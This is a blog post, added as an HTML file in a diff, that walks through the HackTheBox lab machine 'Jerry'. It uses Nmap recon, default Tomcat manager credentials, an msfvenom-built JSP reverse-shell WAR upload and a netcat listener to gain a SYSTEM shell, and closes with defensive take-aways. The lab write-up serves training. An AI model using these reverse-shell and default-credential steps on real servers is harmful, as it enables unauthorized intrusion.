@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.80.0" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || HackTheBox - jerry [no Metasploit]</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-three-fifths" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">HackTheBox - jerry [no Metasploit]</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="October 26, 2020">
+      Oct 26
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/pentest">pentest</a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.re/series/hackthebox">hackthebox</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags/windows">windows</a>
+    <a href="https://shiny-labs.re/tags/tomcat">tomcat</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <h1 id="reconnaissance">Reconnaissance</h1>
+<p>Let&rsquo;s start with a usual Nmap scan for services on TCP ports:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~$ <span class="nb">export</span> <span class="nv">TARGET</span><span class="o">=</span>10.10.10.95
+kali@kali:~$ nmap -sV -sC -p- -O -oA nmap_tcp <span class="nv">$TARGET</span>
+</code></pre></div><p>Results of the TCP scan:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">Nmap scan report for 10.10.10.95
+Host is up (0.16s latency).
+Not shown: 65534 filtered ports
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/7.0.88
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
+No exact OS matches for host (test conditions non-ideal).
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 254.72 seconds
+</code></pre></div><p>Only one port, I guess&hellip; it&rsquo;s full web server for this one&hellip; Great, my speciality /s :D</p>
+<p>Let&rsquo;s start a scan on UDP while we go have a look at the web server then&hellip; (spoiler: nothing on there)</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"># nmap -sU -p- -oA nmap_udp $TARGET
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-23 03:19 EDT
+Stats: 0:03:14 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 3.31% done; ETC: 04:57 (1:34:25 remaining)
+Nmap scan report for 10.10.10.95
+Host is up (0.089s latency).
+All 65535 scanned ports on 10.10.10.95 are open|filtered
+
+Nmap done: 1 IP address (1 host up) scanned in 5847.36 seconds
+</code></pre></div><table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version</th>
+<th>Vuln?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>8080/tcp</td>
+<td>http</td>
+<td>Apache Tomcat 7.0.88/Coyote JSP engine 1.1</td>
+<td>default credentials + manager app</td>
+</tr>
+</tbody>
+</table>
+<h1 id="initial-foothold">Initial Foothold</h1>
+<h2 id="8080-apache-tomcat">8080 Apache Tomcat</h2>
+<p>Let&rsquo;s start by visiting the website: http://10.10.10.95:8080. There&rsquo;s the default start page for the <code>Apache Tomcat/7.0.88</code> (as Nmap already told us).</p>
+<p><img src="img/image-20201025113001130.png" alt="image-20201025113001130"></p>
+<p>Clicking around, <code>Manager App</code> spawns a login prompt:</p>
+<p><img src="img/image-20201026184533716.png" alt="image-20201026184533716"></p>
+<p>Hitting <code>cancel</code> re-route us on a very verbose 401 page:<img src="img/image-20201026184638299.png" alt="image-20201026184638299"></p>
+<p>with&hellip; a username and password: <code>tomcat:s3cret</code>. And you know what? They actually work, we have access to the Application Manager:</p>
+<p><img src="img/image-20201026184856464.png" alt="image-20201026184856464"></p>
+<h1 id="exploitation">Exploitation</h1>
+<p>There&rsquo;s a lot going on that <code>Tomcat Web Application Manager</code> page. First, we can add to our information stash the OS name: <code>Windows Server 2012 R2</code> and its architecture: <code>amd64</code></p>
+<p><img src="img/image-20201026184915785.png" alt="image-20201026184915785"></p>
+<p>Next, that <code>WAR file to deploy</code> with a file upload sounds very interesting. What if we craft a reverse shell and upload it there?</p>
+<p>Does msfvenom supports war files&hellip;? It sure does!</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ msfvenom -p java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.13 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f war &gt; shell.war
+Payload size: <span class="m">1093</span> bytes
+Final size of war file: <span class="m">1093</span> bytes
+</code></pre></div><p>Beepidiboop, we have a reverse shell file! Let&rsquo;s go try that WAR upload feature now:</p>
+<p><img src="img/image-20201026220412414.png" alt="image-20201026220412414"></p>
+<p>We can see our <code>shell</code> application was deployed and is available like any other app:</p>
+<p><img src="img/image-20201026190717733.png" alt="image-20201026190717733"></p>
+<p>Start a netcat listener on the host:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">nc -lvp <span class="m">4444</span>
+</code></pre></div><p>Now, click on the shell link: http://10.10.10.95:8080/shell/ to trigger a connect back on our netcat listener!</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">Connection from 10.10.10.95:49192
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\apache-tomcat-7.0.88&gt;whoami
+whoami
+nt authority\system
+</code></pre></div><p>And we&rsquo;re directly <code>nt authority\system</code>. Huh, I guess that&rsquo;s it then&hellip;?</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\apache-tomcat-7.0.88&gt;dir /s C:\user.txt
+dir /s C:\user.txt
+ Volume in drive C has no label.
+ Volume Serial Number is FC2B-E489
+</code></pre></div><p>Ah, no <code>user.txt</code>? Looks like it&rsquo;s an older machine with another flag format, it can be found in the Administrator&rsquo;s Desktop:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\Users\Administrator\Desktop\flags&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FC2B-E489
+
+ Directory of C:\Users\Administrator\Desktop\flags
+
+06/19/2018  06:09 AM    &lt;DIR&gt;          .
+06/19/2018  06:09 AM    &lt;DIR&gt;          ..
+06/19/2018  06:11 AM                88 2 for the price of 1.txt
+               1 File(s)             88 bytes
+               2 Dir(s)  27,601,944,576 bytes free
+</code></pre></div><h2 id="take-aways">Take-aways</h2>
+<ul>
+<li>Default credentials should never be left unmodified on a service exposed (internally or externally).</li>
+<li>Tomcat probably doesn&rsquo;t need to run as <code>nt authority\system</code></li>
+</ul>
+<p><img src="img/cat_jump_fail.gif" alt="cat fail"></p>
+
+        </div>
+    </article>
+</div>
+
+
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a>
+      <ul>
+        <li><a href="#8080-apache-tomcat">8080 Apache Tomcat</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#take-aways">Take-aways</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+        <div class="copyright">
+        
+            Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma
+        
+        </div>
+
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
